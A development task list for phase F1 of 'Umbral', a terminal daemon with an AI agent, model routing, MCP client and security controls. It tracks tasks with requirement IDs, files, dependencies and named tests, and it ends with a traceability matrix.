# Tasks — Umbral F1 (Agent, models, MCP and security)

> Source specs: `specs/prd/umbral-mvp.md` · `specs/api/umbral-daemon-api-v1.md` · `specs/technical/umbral-architecture.md` · `specs/data-model/umbral-schema.md` · `specs/plans/umbral-mvp-plan.md`
> Plan phase covered: F1 · Generated: 2026-09-11

## Conventions for this file

Same as `umbral-f0-tasks.md`. Tests against real models use the `live` build tag and do not run in
default CI.

## Tasks

### [x] 2026-09-27 T-F1-32 · The handshake has a deadline and always answers
- **What:**
  - a 5 s deadline from accept to a completed `system.hello`, then `UNAUTHORIZED` with a null id
    and a close;
  - before the handshake, a JSON-RPC notification gets `UNAUTHORIZED` with a null id and a
    close;
  - a `system.hello` without an `id` or with a null `id` gets the same at any time, checked
    before any token;
  - API §1 (the JSON-RPC deviation), §2 and §8.
- **REQ:** REQ-SEC-017, REQ-SEC-018
- **Files:** `internal/api/conn.go`, `internal/api/server.go`, `internal/api/system.go`,
  `internal/api/jsonrpc.go`, `internal/api/server_test.go`, `specs/api/umbral-daemon-api-v1.md`
- **Depends on:** F0 complete. **Goes before T-F1-01.**
- **Delta:** `changes/_archive/2026-09-handshake-hardening/`
- **Done:** `TestASilentConnectionIsClosedAfterTheDeadline_REQ_SEC_017` and
  `TestANotificationBeforeHelloIsUnauthorized_REQ_SEC_018` green, each seen red against its own
  deliberate break; `task ci` green.

### [x] 2026-09-27 T-F1-33 · The frame limit is enforced outbound, watched, and adjustable from the CLI
- **What:**
  - **Encoder:** every outbound frame is measured. A response over the limit becomes
    `RESULT_TOO_LARGE` (`-32014`, with `size_bytes` and `limit_bytes`). A notification over it
    becomes `limits.notification_dropped` under the same `seq`.
  - **`block.get`:** shortens its output to fit, on a UTF-8 boundary or a base64 boundary, and
    reports `output_response_truncated_bytes`.
  - **Monitoring:** `frames` counters in `system.status` and `limits.get`; warn logs without
    content.
  - **The setting:** `[api] max_message_bytes` (1–64 MiB, default 4) is the first live key.
    `limits.set` rewrites only that line, atomically, covering every case in the delta's
    file-cases table. The 4 MiB limit before the handshake is
    fixed. `max_message_bytes` is announced in `system.hello` and adopted by `internal/client`.
  - **CLI:** `umb limits` and `umb limits set --max-message <size>`, the `frames` line in
    `umb status`, and the hint on `RESULT_TOO_LARGE`.
  - **Spec edits:** API §1–§9, Tech §5.1, §7.2 and §9.4.
- **REQ:** REQ-API-005, REQ-OBS-005, REQ-CLI-007
- **Files:** `internal/api/**`, `internal/client/**`, `internal/config/**`, `cmd/umb/**`,
  `cmd/umbrald/**`,
  `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`
- **Depends on:** T-F1-32. **Goes before T-F1-01.**
- **Delta:** `changes/_archive/2026-09-frame-limit-monitoring/` — its Verification and its
  file-cases table are what this task's Done refers to.
- **Done:** the four tests of the delta's Verification are green, and each was seen red against
  its own break. `task schema` and `task ci` are green.

### [x] 2026-09-27 T-F1-01 · Migration 0005 (agent, models, audit, MCP, skills)
- **What:** Data Model tables §2.4c to §2.13 with their indexes, plus recovery §6 steps 3-4.
  `threads` (§2.5) is **not** created here: migration 0001 already created it (§5, finding A-01).
  The structure tables (§2.4b) are **not** created here either: migration 0003 owns them (T-F0-14).
  `messages` includes `client_msg_id` and its partial unique index `idx_messages_client_msg`.
  `skills` (§2.4f, delta `2026-09-skills-cli`) is created here too, so T-F1-34 never has to edit
  a written migration.
- **REQ:** REQ-AGT-011, REQ-LLM-005, REQ-SEC-002
- **Files:** `internal/store/migrations/0005_agent.sql`, `internal/store/**`
- **Depends on:** F0 complete, T-F1-32, T-F1-33 — the two protocol tasks go first
- **Done:** `TestMigration0005Constraints` and `TestRecoveryExpiresPendingApprovals_REQ_AGT_011` green.

### [x] 2026-09-27 T-F1-02 · Keyring and configuration loader
- **What:**
  - TOML loader with JSON Schema;
  - resolution of `keyring:<path>` with go-keyring;
  - rejection (`CONFIG_INVALID`) of plaintext API keys;
  - degraded start when the keyring is unavailable: the daemon does not abort, the providers whose
    credential is `keyring:<path>` are disabled, their models get `health = down` with reason
    `keyring_unavailable` and `umb status` shows that reason (REQ-SEC-008);
  - the `env:<VAR>` fallback, accepted only when the keyring is unavailable and
    `[secrets] allow_env = true`, reported as `degraded` with reason `env_secret` (REQ-SEC-012);
  - `config.get` and `config.reload`.
- **REQ:** REQ-SEC-004, REQ-SEC-008, REQ-SEC-012
- **Files:** `internal/config/**`, `internal/security/{domain,ports}/**`,
  `internal/security/adapters/keyring/**`, `internal/api/config*.go`, `cmd/umbrald/providers*.go`,
  `cmd/umb/main.go`, `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`
- **Depends on:** T-F1-01
- **Done:** `TestPlaintextKeyRejected_REQ_SEC_004`, `TestKeyringUnavailableDisablesProviders_REQ_SEC_008` and `TestEnvFallbackOnlyWhenEnabled_REQ_SEC_012` green; with `allow_env = false` and no keyring, no provider starts with a credential.

### [x] 2026-09-27 T-F1-03 · [P] Policy engine
- **What:** pure `Decide()` following DD-006 precedence and the Tech Design §5.3 table; destructive-pattern list; workspace computation; taint.
- **REQ:** REQ-AGT-009, REQ-AGT-013, REQ-AGT-014, REQ-SEC-005, REQ-SEC-006
- **Files:** `internal/security/domain/policy*.go`
- **Depends on:** T-F1-01
- **Done:** table tests `TestAskModeReadOnlyTools_REQ_AGT_009`, `TestPolicyAutoEditWorkspace_REQ_AGT_013`, `TestPolicyNormalDefaultAsk_REQ_AGT_014` (the matrix names), `TestDestructiveAlwaysAsk_REQ_SEC_005` and `TestTaintedRequiresAsk_REQ_SEC_006` green, with ≥ 90 % package coverage.

### [x] 2026-09-27 T-F1-04 · [P] Secret redaction
- **What:** rules (AWS/GCP/GitHub/GitLab/OpenAI/Anthropic/HF keys, JWT, PEM private keys, `.env`) plus an entropy detector; replacement with `[REDACTED:<rule>]`.
- **REQ:** REQ-SEC-001
- **Files:** `internal/security/domain/redact*.go`, `internal/security/domain/testdata/redact/**`
- **Depends on:** T-F1-01
- **Done:** `TestRedactionCorpus_REQ_SEC_001` (corpus with ≥ 30 positives and ≥ 30 negatives) green.

### [x] 2026-09-27 T-F1-05 · Gateway: ports, catalog and openai-compat adapters
- **What:**
  - `Provider` port (architecture §6) with normalized events;
  - `llamacpp`, `lmstudio`, `openrouter` and `openai-compat` adapters on top of Fantasy;
  - discovery through `/v1/models`;
  - `model.list` with `refresh`;
  - the models of a provider T-F1-02 left `down` (no keyring, a refused `env:`, a missing
    secret) are listed `health = down` with that provider's reason, and are never called —
    REQ-SEC-008's second clause, which T-F1-02 could not close before the model rows existed.
    Delta `2026-09-provider-config` decides whether the reason is read from the provider or
    needs its own column.
- **REQ:** REQ-LLM-001, REQ-LLM-002, REQ-SEC-008 (and, from the review, REQ-SEC-002 and REQ-LLM-004 for discovery)
- **Files:** `internal/llmgw/{domain,ports}/**`, `internal/llmgw/catalog.go` (the module's service, like `sessions` and `workspaces`), `internal/llmgw/adapters/{fantasyconv,openaicompat,openrouter,modelstore,egresslog}/**`, `internal/api/models.go`, `cmd/umbrald/gateway.go`, `.go-arch-lint.yml`
- **Depends on:** T-F1-02
- **Done:** tests with a fake server `TestDiscoverModels_REQ_LLM_002` and `TestStreamNormalized_REQ_LLM_001` green; `TestModelsOfADownProviderAreDown_REQ_SEC_008` green.

### [x] 2026-09-27 T-F1-06 · Native Ollama adapter
- **What:**
  - `/api/chat` with streaming, tools, `think`, `format` and `num_ctx`;
  - `keep_alive`;
  - discovery through `/api/tags`.
- **REQ:** REQ-LLM-001, REQ-LLM-006
- **Files:** `internal/llmgw/adapters/ollama/**`, `internal/llmgw/domain/stream.go` (`Reasoning`, `ResponseSchema`, `ToolName`), `cmd/umbrald/gateway.go`
- **Depends on:** T-F1-05
- **Done:** `TestOllamaSendsNumCtx_REQ_LLM_006` (fake) green; `TestOllamaLive` (tag `live`) green against `gpt-oss:20b`.

### [x] 2026-09-27 T-F1-07 · Router, fallback, usage and egress hooks
- **What:**
  - candidates per class and offline filter;
  - capability filter;
  - health;
  - fallback on 429, 5xx and first-token timeout (30 s remote / 120 s local);
  - recording in `usage`;
  - redaction before sending;
  - `egress_log` for non-loopback hosts — the transport that writes it exists since T-F1-05
    (`fantasyconv.EgressTransport`); this task marks each call's context with its thread
    (`domain.WithThread`) and redacts before the payload is hashed;
  - capability honesty: the openai-compat and OpenRouter adapters ignore `Request.Reasoning` and
    `Request.ResponseSchema` since T-F1-05/06, so until they carry them the router must not pick
    those adapters for a request that sets them, or they must refuse it with a non-retryable
    `ProviderError`; and a request that cannot be built (Status 0 today, so retryable) must not
    be retried on another candidate.
- **REQ:** REQ-LLM-003, REQ-LLM-004, REQ-LLM-005, REQ-SEC-001, REQ-SEC-002
- **Files:** `internal/llmgw/router.go` (the router is part of `llmgw-service`, where `.go-arch-lint.yml` already placed it), `internal/llmgw/domain/usage.go`, `internal/llmgw/domain/stream.go`, `internal/llmgw/ports/provider.go`, `internal/llmgw/adapters/usagelog/**`, `internal/llmgw/adapters/fantasyconv/fantasyconv.go`, `internal/llmgw/adapters/ollama/ollama.go`, `cmd/umbrald/gateway.go`, `cmd/umbrald/main.go`; delta `changes/_archive/2026-09-router-fallback/`
- **Depends on:** T-F1-04, T-F1-06
- **Done:** tests `TestFallbackOn429_REQ_LLM_003`, `TestOfflineRejectsRemote_REQ_LLM_004`, `TestUsageRecorded_REQ_LLM_005` and `TestEgressLoggedForRemote_REQ_SEC_002` green.

### [x] 2026-09-27 T-F1-08 · [P] HF router and OmniRoute presets
- **What:** commented configuration templates (`examples/models.toml`) and validation that both go through `openai-compat`.
- **REQ:** REQ-LLM-007
- **Files:** `examples/models.toml`, `internal/config/presets*.go`, `cmd/umbrald/gateway_test.go`
- **Depends on:** T-F1-05
- **Done:** `TestPresetsLoad_REQ_LLM_007` green.

### [x] 2026-09-27 T-F1-09 · Tool registry and built-in tools
- **What:**
  - microkernel registry with JSON Schema validation;
  - tools `read_file`, `write_file`, `edit_file` (with unified diff), `grep`, `glob`, `list_dir` and `fetch_url`;
  - `fetch_url` marks taint.
- **REQ:** REQ-AGT-002, REQ-AGT-012, REQ-AGT-018, REQ-SEC-006 (and, from the review, REQ-AGT-004, REQ-AGT-013, REQ-AGT-014 and REQ-SEC-002)
- **Files:** `internal/tools/{domain,ports}/**`, `internal/tools/adapters/{registry,builtin}/**` (the built-ins are adapters, which `.go-arch-lint.yml` maps; it gains `tools-adapters` → `tools-adapters` for the registry's tests); delta `changes/_archive/2026-09-builtin-tools/`
- **Depends on:** T-F1-03
- **Done:** `TestToolSchemasDeclared_REQ_AGT_002`, `TestEditFileProducesDiff_REQ_AGT_012`, `TestFetchMarksTaint_REQ_SEC_006` and `TestFetchUrlRefusesPrivateRanges_REQ_AGT_018` green, including the redirect-to-loopback case.

### [x] 2026-09-27 T-F1-10 · `run_command` in the thread PTY
- **What:**
  - dedicated PTY per thread (session with `owner_thread_id`), with the `agent` lock;
  - block with `origin = agent`;
  - process group so it can be terminated.
- **REQ:** REQ-AGT-003, REQ-AGT-007
- **Files:** `internal/tools/adapters/builtin/runcommand*.go`, `internal/sessions/**` (`agent.go`, the recorder's claim, the PTY's `SignalKillForeground`, the `AgentTerminal` port); delta `changes/_archive/2026-09-builtin-tools/` (decisions 6–9)
- **Depends on:** T-F1-09
- **Done:** `TestRunCommandCreatesAgentBlock_REQ_AGT_003` green.

### [x] 2026-09-27 T-F1-11 · [P] Context: rules, attachments and git
- **What:**
  - rules-file lookup from the repo root down to the cwd;
  - `@file`, `@directory` and `@block:<id>` attachments with truncation at 256 KiB;
  - git context;
  - prompt templates.
- **REQ:** REQ-CTX-001, REQ-CTX-002, REQ-CTX-003, REQ-CTX-005
- **Files:** `internal/context/**`
- **Depends on:** T-F1-01
- **Done:** tests `…_REQ_CTX_001/002/003/005` green with fixture repos.

### [x] 2026-09-27 T-F1-12 · Token budget and compaction
- **What:** token estimation (Q-03), response reserve, and compaction via a summary made by an injected summarizer (the runtime passes the `fast` class), returning the `context.compacted` payload; T-F1-13 persists the summary and publishes the notification (delta `2026-09-context-budget`, decision 8).
- **REQ:** REQ-CTX-004
- **Files:** `internal/context/domain/budget.go` (pure: the arch rules map `internal/context` to domain, ports and adapters, and the budget needs no I/O)
- **Depends on:** T-F1-11
- **Done:** `TestCompactionTriggeredOverWindow_REQ_CTX_004` green.

### [x] 2026-09-27 T-F1-13 · Agent runtime and `thread.*`
- **What:**
  - per-turn loop that persists before notifying (DD-007);
  - methods `thread.create`, `send`, `get`, `list` and `update`;
  - notifications `thread.delta`, `thread.tool_call` and `thread.turn_finished`;
  - `max_steps` and budget;
  - model change on the next turn;
  - `ask` mode exposes only ReadOnly tools;
  - `thread.send` idempotency by `client_msg_id`: a repeated key returns the original
    `{turn_id, message_id}` without creating a turn and without re-running its tools, including
    while the first turn is still running (REQ-AGT-015).
- **REQ:** REQ-AGT-001, REQ-AGT-008, REQ-AGT-009, REQ-AGT-010, REQ-AGT-011, REQ-AGT-015, REQ-CTX-004 (the call before sending, and the event)
- **Files:** `internal/agents/**`, `internal/api/threads.go`
- **Depends on:** T-F1-07, T-F1-10, T-F1-12
- **Done:** tests `…_REQ_AGT_001/008/009/010/011` green with a scripted fake provider; `TestSendIdempotentByClientMsgID_REQ_AGT_015` green (two identical sends → one turn, and the tools run once). `TestCompactedEventPersistedThenPublished_REQ_CTX_004` green (the summary is a `system_note` row before `context.compacted` is published).

### [ ] T-F1-14 · Approval flow
- **What:**
  - `approval.requested` pauses the turn and `approval.respond` resumes it;
  - rule persistence (`thread` / `always`); destructive patterns ignore `always`;
  - denial returns `denied_by_user`;
  - `approval.list`.
- **REQ:** REQ-AGT-004, REQ-AGT-005, REQ-SEC-005
- **Files:** `internal/agents/approval*.go`, `internal/api/approvals.go`
- **Depends on:** T-F1-13
- **Done:** `TestAskPausesTurn_REQ_AGT_004` and `TestDenyReturnsDeniedByUser_REQ_AGT_005` green.

### [ ] T-F1-15 · Repair of invalid tool calls
- **What:** one retry with a repair message; on the second failure, `stop_reason = tool_error`; increment `umbral_tool_calls_invalid_total{model}`.
- **REQ:** REQ-AGT-006, REQ-OBS-002
- **Files:** `internal/agents/repair*.go`, `internal/obs/metrics.go`
- **Depends on:** T-F1-13
- **Done:** `TestInvalidArgsRepairOnce_REQ_AGT_006` and `TestInvalidMetricIncrements_REQ_OBS_002` green.

### [ ] T-F1-16 · Cancellation
- **What:** `thread.cancel` cancels the turn's context; SIGTERM to the process group; SIGKILL after 300 ms.
- **REQ:** REQ-AGT-007
- **Files:** `internal/agents/cancel*.go`
- **Depends on:** T-F1-13
- **Done:** `TestCancelUnder500ms_REQ_AGT_007` (with `sleep 60` running) green.

### [ ] T-F1-17 · MCP client
- **What:**
  - stdio and streamable HTTP connections with the official SDK;
  - `mcp_<server>_<tool>` prefix;
  - `mcp.server.add`/`remove`/`list`, with `trust = untrusted` by default;
  - 10 s timeout and exponential backoff (at most 5 attempts);
  - `ask` policy by default.
- **REQ:** REQ-MCP-001, REQ-MCP-002, REQ-MCP-003, REQ-MCP-004
- **Files:** `internal/mcp/client/**`, `internal/tools/mcptools/**`
- **Depends on:** T-F1-09
- **Done:** tests with a test MCP server written in Go `…_REQ_MCP_001/002/003/004` green.

### [ ] T-F1-18 · OTel observability
- **What:**
  - root span `agent.turn` with children `llm.call` and `tool.*`, with GenAI attributes;
  - `trace_id` in `slog` logs;
  - optional OTLP exporter.
- **REQ:** REQ-OBS-001, REQ-OBS-003, REQ-OBS-004
- **Files:** `internal/obs/**`
- **Depends on:** T-F1-13
- **Done:** `TestTurnTraceHasSpans_REQ_OBS_001` (in-memory exporter) and `TestOrchestrationMetricsExposed_REQ_OBS_004` green.

### [ ] T-F1-19 · `umb ai` with stdin
- **What:** ephemeral thread in `ask` mode; stdin as an attachment (at most 1 MiB, truncation noted); streaming to stdout; non-zero exit code if the turn ends in error.
- **REQ:** REQ-CLI-001
- **Files:** `cmd/umb/ai.go`
- **Depends on:** T-F1-13
- **Done:** `TestUmbAiPipesStdin_REQ_CLI_001` green.

### [ ] T-F1-20 · TUI: agent panel
- **What:**
  - thread panel with deltas;
  - toggle input between shell and agent with `ctrl+space`;
  - approval queue with `[a]pprove`, `[d]eny` and `a[l]ways`, plus a diff view;
  - "attach to agent" action on a block.
- **REQ:** REQ-TUI-001, REQ-TUI-002, REQ-TUI-003
- **Files:** `internal/tui/agent/**`
- **Depends on:** T-F1-14
- **Done:** teatest tests `…_REQ_TUI_002/003` green; `docs/qa/f1-tui.md` completed.

### [ ] T-F1-21 · Live US-003 E2E
- **What:**
  - Go fixture repo with a broken test;
  - script that runs 20 times: create an `auto-edit` thread, attach the failed block, "fix it", auto-approve `run_command go test`, with `router.offline = true`;
  - report with success rate, invalid tool call rate and latency.
- **REQ:** REQ-AGT-001, REQ-LLM-004, REQ-SEC-002 (PRD §4.1 goal)
- **Files:** `e2e/us003/**`, `docs/reports/us003-<date>.md`
- **Depends on:** T-F1-20
- **Done:** report with ≥ 14/20 successes and 0 rows in `egress_log` during the run.

### [ ] T-F1-22 · Hardening
- **What:** retention job (Data Model §4), E2E verification of recovery after `kill -9` of the daemon, user guide for provider configuration.
- **REQ:** REQ-AGT-011, Art. 6
- **Files:** `internal/store/retention*.go`, `docs/user/*.md`
- **Depends on:** T-F1-21
- **Done:** `TestRetentionPurgesRawChunks` and `TestCrashRecovery_REQ_AGT_011` green.

### [ ] T-F1-23 · Wait engine
- **What:**
  - `thread.wait` owned by the server and driven by events, pinning the current turn;
  - `wait` object inside `thread.send` as one ordered submission;
  - `block.wait_output` with RE2 over recent output;
  - typed `TIMEOUT` carrying the last observed state.
- **REQ:** REQ-AUT-001, REQ-AUT-002, REQ-AUT-003, REQ-AUT-004
- **Files:** `internal/agents/wait/**`, `internal/api/waits.go`, `cmd/umb/wait.go`
- **Depends on:** T-F1-13
- **Done:** tests `TestWaitPinsTurn_REQ_AUT_001`, `TestSendWaitRejectsBlocked_REQ_AUT_002`, `TestWaitOutputMatchesLine_REQ_AUT_003` and `TestWaitTimeoutReportsLastState_REQ_AUT_004` green.

### [ ] T-F1-24 · Attention state and thread resume
- **What:** writing `attention_state` and `seen_at` on threads; `done` until a client focuses it; `thread.attention_changed` notification; restore threads after a restart with their history and `stopped` turns. The two columns already exist: T-F1-01 added them with the `ALTER TABLE` statements of Data Model §2.5 in migration **0005**, which is applied and is not edited again (Art. 6). This task writes to them; enforcing `attention_state`'s values is the writer's job, since SQLite cannot add a `CHECK` in an `ALTER`.
- **REQ:** REQ-AGT-016, REQ-AGT-017
- **Files:** `internal/agents/attention*.go`, `internal/store/**` (not `0005_agent.sql`, which T-F1-01 wrote)
- **Depends on:** T-F1-13
- **Done:** `TestDoneUntilFocused_REQ_AGT_016` and `TestThreadsResumeAfterRestart_REQ_AGT_017` green.

### [ ] T-F1-25 · Integration surface
- **What:**
  - injection of `UMBRAL_*` variables with Umbral's values winning;
  - `pane.report_state` and `pane.release_state` with `source` and `seq`;
  - the rule that Umbral's own agent owns the panes of its threads.
- **REQ:** REQ-INT-001, REQ-INT-002, REQ-INT-003, REQ-INT-005, REQ-INT-006
- **Files:** `internal/integrations/**`, `internal/api/panes.go`, `cmd/umb/pane.go`
- **Depends on:** T-F1-13
- **Done:** tests `TestEnvInjectedAndAuthoritative_REQ_INT_001`, `TestExternalReportDrivesRollup_REQ_INT_002`, `TestStaleSeqIgnored_REQ_INT_003` and `TestReleaseRestoresOwnDetection_REQ_INT_005` and `TestOwnAgentCannotBeDisplaced_REQ_INT_006` green.

### [ ] T-F1-26 · Display metadata and tokens
- **What:** `pane.report_metadata` with normalization, 80-character cap, TTL, 16 keys per report and 32 per pane; strict separation from semantic state.
- **REQ:** REQ-INT-004
- **Files:** `internal/integrations/metadata*.go`
- **Depends on:** T-F1-25
- **Done:** `TestMetadataNeverChangesWaits_REQ_INT_004` green, including the limit and expiry cases.

### [ ] T-F1-27 · Notifications
- **What:** `notification.show` with normalization, delivery to the foreground client, typed reasons and a rate limit of 5 per source per 60 s.
- **REQ:** REQ-NTF-001, REQ-NTF-002
- **Files:** `internal/notify/**`, `internal/api/notifications.go`
- **Depends on:** T-F1-24
- **Done:** `TestNotificationNormalizesAndReports_REQ_NTF_001` and `TestNotificationRateLimited_REQ_NTF_002` green.

### [ ] T-F1-28 · Policy explain
- **What:** `policy.explain` returning the decision and the ordered trace of DD-006, read-only; `umb policy explain` on the CLI. The trace is `Decision.Trace` of T-F1-03: the `exposure` step plus DD-006's six, every one evaluated, one marked `decided` (delta `2026-09-policy-precedence`, decision 5 — the API §5.36 example is updated here).
- **REQ:** REQ-SEC-009
- **Files:** `internal/security/explain*.go`, `cmd/umb/policy.go`
- **Depends on:** T-F1-03
- **Done:** `TestExplainNamesDecidingRule_REQ_SEC_009` green with one case per precedence step.

### [ ] T-F1-29 · Rule overrides and optional updates
- **What:** load redaction rules and destructive patterns from `$XDG_CONFIG_HOME/umbral/rules/`; precedence over the built-in ones; invalid files ignored with a warning; optional remote fetch disabled by default and logged in `egress_log`.
- **REQ:** REQ-SEC-010, REQ-SEC-011
- **Files:** `internal/security/rules/**`, `internal/config/**`
- **Depends on:** T-F1-04
- **Done:** `TestLocalRulesWin_REQ_SEC_010` and `TestRuleUpdateOptInAndLogged_REQ_SEC_011` green; with `rules_check = false` no request leaves the machine.

### [ ] T-F1-30 · Signed rule bundles, trust store and recovery
- **What:**
  - bundle format (rules + version + Ed25519 detached signature) and verification against `trust_keys`;
  - monotonic version check and rejection with a logged reason plus `rules.update_rejected`;
  - `rules.key.add|list|remove|rotate` with fingerprint confirmation and protection of the last key;
  - fail-closed after three failures or with no valid key;
  - `rules.rollback` and `rules.reset`, both offline and without needing a key;
  - `rules.status` reporting the active bundle, the previous one, the keys and the last rejection.
- **REQ:** REQ-SEC-011, REQ-SEC-013, REQ-SEC-014, REQ-SEC-015, REQ-SEC-016
- **Files:** `internal/security/rules/bundle*.go`, `internal/security/rules/trust*.go`, `internal/api/rules.go`, `cmd/umb/rules.go`
- **Depends on:** T-F1-29
- **Done:** tests `TestBundleRequiresValidSignature_REQ_SEC_011`, `TestRejectsUnknownKeyAndDowngrade_REQ_SEC_013`, `TestKeyLifecycleRequiresFingerprint_REQ_SEC_014`, `TestFailClosedAfterThreeFailures_REQ_SEC_015` and `TestRollbackAndResetWorkOffline_REQ_SEC_016` green; the recovery case (every key removed with `--force`, then `rules.reset`) is covered end to end.

### [ ] T-F1-31 · Wait monitoring and lifecycle
- **What:**
  - enforcement of the concurrency and rate limits with the responses from REQ-AUT-005;
  - `wait.list` with age and stalled flag;
  - `wait.cancel` that does not touch the observed turn;
  - stall detection per turn with a configurable window and the `thread.stalled` notification;
  - `umb wait ls` and `umb wait cancel` on the CLI.
- **REQ:** REQ-AUT-005, REQ-AUT-006, REQ-AUT-007, REQ-AUT-008
- **Files:** `internal/waits/**`, `internal/api/waits.go`, `cmd/umb/wait.go`
- **Depends on:** T-F1-23
- **Done:** tests `TestLimitsDegradeWithoutDisconnect_REQ_AUT_005`, `TestWaitListReportsAgeAndStalled_REQ_AUT_006`, `TestCancelLeavesTurnRunning_REQ_AUT_007` and `TestStalledTurnNotifiedNotKilled_REQ_AUT_008` green; a script that leaks 100 waits does not bring the connection down.

### [ ] T-F1-34 · Skill store and `skill.*` methods
- **What:**
  - **Bundle checks:** front matter; entry kinds; paths; modes; size and entry limits enforced
    while streaming; the canonical-manifest digest.
  - **Store:** staging and rename into `$XDG_DATA_HOME/umbral/skills/<name>/`; the recovery
    sweep of Data Model §6.
  - **Methods:** `skill.inspect`, `install` (with `expected_sha256`), `list`, `get`,
    `set_enabled` and `remove`, plus `skill.changed`.
  - **Rules:** local sources only, classified before resolving; at most 64 enabled, and a 65th
    install is stored disabled.
  - **Arch:** the `api` rows. The `skills` table is created by T-F1-01 (Data Model §2.4f).
  - **Spec edits:** API §2–§6 and §9; Tech §3.2 (`context` gains the skill store and catalog).
- **REQ:** REQ-SKL-001, REQ-SKL-002, REQ-SKL-006
- **Files:** `internal/context/**`, `internal/store/**`, `internal/api/**`, `.go-arch-lint.yml`,
  `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`
- **Depends on:** T-F1-01 (0005 includes `skills`)
- **Delta:** `changes/_archive/2026-09-skills-cli/`
- **Done:** these are green and `task schema` and `task arch` are green:
  - `TestInstallCopiesRecordsAndRunsNothing_REQ_SKL_001`;
  - `TestABadBundleIsRefusedWhole_REQ_SKL_002`;
  - `TestACrashMidInstallLeavesNothingAfterRestart_REQ_SKL_002`;
  - `TestARemoteSourceIsRefused_REQ_SKL_006`.

### [ ] T-F1-35 · `umb skill`
- **What:** `umb skill install|list|show|enable|disable|remove`; inspect, confirm, then install
  with the shown digest; `--yes`, `--replace` and `--json`.
- **REQ:** REQ-SKL-001, REQ-SKL-003
- **Files:** `cmd/umb/**`, `specs/technical/umbral-architecture.md`
- **Depends on:** T-F1-34
- **Done:** `TestInstallAsksOrNeedsYes_REQ_SKL_001` and
  `TestSkillCommandsMirrorTheMethods_REQ_SKL_003` green.

### [ ] T-F1-36 · Umbral's agent sees skills, loads them on demand, and treats them as untrusted
- **What:**
  - **Catalog:** in every prompt, capped at 256 characters per description and 64 skills,
    inside the budget; rebuilt per turn, so changes reach the next turn.
  - **`skill_load`:** a `ReadOnly` tool behind a `tools/ports.SkillReader`; `file` confined to
    the bundle; its output taints the turn (REQ-SEC-006).
  - **Destructive patterns:** `umb skill install|enable|remove` and `umb mcp add` join the list.
  - **Spec edits:** Tech §3.2 (`tools` gains `skill_load`) and §5.3 (the destructive patterns).
- **REQ:** REQ-SKL-004, REQ-SKL-005, REQ-SKL-007
- **Files:** `internal/context/**`, `internal/tools/**`, `internal/security/**`, `cmd/umbrald/**`,
  `specs/technical/umbral-architecture.md`
- **Depends on:** T-F1-09, T-F1-11, T-F1-12, T-F1-14, T-F1-34
- **Done:** these are green:
  - `TestPromptCarriesDescriptionsNotBodies_REQ_SKL_004`;
  - `TestASkillCannotRunOrWidenAnything_REQ_SKL_005`;
  - `TestASkillChangeReachesTheNextTurn_REQ_SKL_007`.

### [ ] T-F1-37 · `umb mcp`, and the agent panel's extensions view
- **What:**
  - `umb mcp add|list|remove`, with `--stdio -- <command>`, `--http <url>`,
    `--env NAME=keyring:<path>` and `--json`; always `untrusted`; plaintext `--env` refused in
    the CLI;
  - API §2's `cli` row gains the three `mcp.server.*` methods; §5.27 gains `remove`'s and
    `list`'s params;
  - `--env` accepts `keyring:` and `env:` references and refuses anything else;
  - the agent panel lists MCP servers with their live state and skills with enabled or not, and
    for each turn the MCP tools called and the skills loaded.
- **REQ:** REQ-CLI-008, REQ-TUI-004
- **Files:** `cmd/umb/**`, `internal/api/system.go`, `internal/tui/agent/**`,
  `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`
- **Depends on:** T-F1-17, T-F1-20, T-F1-35
- **Delta:** `changes/_archive/2026-09-cli-mcp/`
- **Done:** `TestMcpCommandsMirrorTheMethods_REQ_CLI_008`, `TestCliMayManageMcpServers_REQ_CLI_008`
  and `TestAgentPanelShowsServersAndSkills_REQ_TUI_004` green.

## Traceability matrix (F1)

| REQ | Tasks | Tests citing it |
|---|---|---|
| REQ-AGT-001 | T-F1-13, T-F1-21 | TestSendStreamsDeltas_REQ_AGT_001, e2e us003 |
| REQ-AGT-002 | T-F1-09 | TestToolSchemasDeclared_REQ_AGT_002, TestInvalidInputIsRefused_REQ_AGT_002, TestRegistrationChecksTheSpec_REQ_AGT_002, TestReadsAreBounded_REQ_AGT_002 |
| REQ-AGT-003 | T-F1-10 | TestRunCommandCreatesAgentBlock_REQ_AGT_003, TestAClaimMarksTheNextBlockOnly_REQ_AGT_003, TestRunCommandRunsInTheThreadsTerminal_REQ_AGT_003, TestParallelFirstUsesShareOnePTY_REQ_AGT_003 |
| REQ-AGT-004 | T-F1-09, T-F1-14 | TestAskPausesTurn_REQ_AGT_004; T-F1-09: TestNoToolRunsWithoutAGrant_REQ_AGT_004 |
| REQ-AGT-005 | T-F1-14 | TestDenyReturnsDeniedByUser_REQ_AGT_005 |
| REQ-AGT-006 | T-F1-15 | TestInvalidArgsRepairOnce_REQ_AGT_006 |
| REQ-AGT-007 | T-F1-10, T-F1-16 | TestCancelUnder500ms_REQ_AGT_007 (T-F1-16, through `thread.cancel`); T-F1-10: TestKillForegroundUnder500ms_REQ_AGT_007 (the kill itself, from a cancelled context) |
| REQ-AGT-008 | T-F1-13 | TestStopsAtMaxSteps_REQ_AGT_008 |
| REQ-AGT-009 | T-F1-03, T-F1-13 | TestAskModeReadOnlyTools_REQ_AGT_009 |
| REQ-AGT-010 | T-F1-13 | TestModelSwitchNextTurn_REQ_AGT_010 |
| REQ-AGT-011 | T-F1-01, T-F1-13, T-F1-22 | TestRecoveryExpiresPendingApprovals_REQ_AGT_011, TestPersistBeforeNotify_REQ_AGT_011, TestCrashRecovery_REQ_AGT_011 |
| REQ-AGT-013 | T-F1-03, T-F1-09 | TestPolicyAutoEditWorkspace_REQ_AGT_013; T-F1-09: TestTheTargetFollowsSymlinks_REQ_AGT_013, TestAGrantDoesNotSurviveASwappedLink_REQ_AGT_013, TestAWriteStaysUnderItsDirectory_REQ_AGT_013, TestARelativeEnvIsRefused_REQ_AGT_013, TestTheWriteUsesTheCheckedTarget_REQ_AGT_013 |
| REQ-AGT-014 | T-F1-03, T-F1-09 | TestPolicyNormalDefaultAsk_REQ_AGT_014; T-F1-09: TestAToolCannotLowerItsRisk_REQ_AGT_014 |
| REQ-CTX-001 | T-F1-11 | TestRulesFilesPrecedence_REQ_CTX_001 |
| REQ-CTX-002 | T-F1-11 | TestAttachments_REQ_CTX_002 |
